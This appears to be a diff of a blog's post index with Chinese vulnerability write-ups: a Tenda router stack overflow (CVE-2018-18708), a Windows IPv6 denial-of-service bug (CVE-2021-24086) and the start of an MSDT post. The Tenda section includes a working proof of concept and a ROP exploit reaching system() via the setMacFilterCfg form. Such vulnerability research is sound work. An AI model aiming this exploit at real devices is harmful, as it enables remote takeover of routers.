-<p>v8和s.sa_data[2]、a1有关</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
-<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
-<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
-<p>查看getIfIp</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
-<p>getIfIp为外部导入函数，位于libcommon.so中</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
-<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
-<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
-<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
-<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
-sudo brctl addif br0 eth0
-sudo ifconfig br0 up
-sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>重新启动找到了br0网卡并获取了ip地址</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
-<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
-缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
-字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
-<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
-<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
-<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
-<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
-<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
-<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
-<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
-<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
-<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
-<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
-<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
-<p>最终到达漏洞点之后会检测包含\r的字符串</p>
-<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
-<p>返回{“errCode”:2}</p>
-<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
-<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
-<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
-<p>之后会对v19进行判断</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
-<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
-<p>所以必须传参setMacFilterCfg为black或者white</p>
-<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
-<p>第二个参数是需要有\n，并且返回其地址。</p>
-<p>之后都会进入sub_C17A0函数</p>
-<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
-<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
-<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
-<p>根据http post请求内容构造</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-url = "http://192.168.130.137/goform/setMacFilterCfg"
-cookie = {"Cookie":"password=csplqw"}
-data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
-requests.post(url, cookies=cookie, data=data)
-requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>测试</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
-
-gdb-multiarch ./bin/httpd
-target remote:1111
-
-python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
-<p>正好覆盖</p>
-<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
-<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
-<p>找偏移</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
-<p>算基址</p>
-<p>0x3fdda508-3e508=0x3fd9C000</p>
-<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
-ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
-<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
-<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-from pwn import *
-cmd = b"echo hello"
-libc_base = 0x3fd9C000
-system_offset = 0x005a270
-gadget1_offset = 0x00018298
-gadget2_offset = 0x00040cb8
-system_addr = libc_base + system_offset
-gadget1 = gadget1_offset + libc_base
-gadget2 = gadget2_offset + libc_base
-payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
-url = "http://192.168.130.137/goform/setMacFilterCfg"
-cookie = {"Cookie":"password=csplqw"}
-data = {"macFilterType": "black", "deviceList":b"\r" + payload}
-requests.post(url, cookies=cookie, data=data)
-requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
-    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
-<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
-<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
-  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
-  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
-  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
-  [in]           ULONG      AlignMultiple, //幂对齐
-  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
-);
-
-NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
-如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
-如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
-如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
-如果 Storage 参数为 NULL，则返回值为 NULL。
-由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
-<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
-<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
-<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
-<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
-<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
-<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
-<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
-<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
-<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
-<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
 ]]></content>
       <categories>
         <category>CVE</category>
@@ -1255,173 +1203,49 @@ SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
-    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
-<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
+    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
+    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
+<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
+<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
+  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
+  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
+  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
+  [in]           ULONG      AlignMultiple, //幂对齐
+  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
+);
 
-<ul>
-<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
-<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
-<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
-</ul>
-<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
-<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
-</li>
-<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
-</li>
-<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
-</li>
-<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
-</li>
